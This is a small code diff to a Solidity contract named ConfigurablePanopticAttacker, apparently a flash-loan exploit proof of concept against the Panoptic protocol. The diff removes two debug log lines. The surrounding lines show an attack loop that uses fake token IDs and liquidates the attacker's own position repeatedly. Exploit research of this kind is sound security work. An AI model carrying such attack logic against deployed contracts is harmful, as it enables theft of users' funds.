@@ -307,9 +307,6 @@ contract ConfigurablePanopticAttacker is IFlashLoanReceiver {
         console.log("my final token 1 balance: ", token1.balanceOf(address(this)));
         console.log("------------------------");
 
-        console.log('twoRealPositions fingerprint', generateFingerprint(twoRealPositions, 0));
-        console.log('fakeTokenIdList fingerprint', generateFingerprint(fakeTokenIdList, 0));
-
         // now liquidate my own position and repeat...
         liquidateSelf(twoRealPositions);
     }
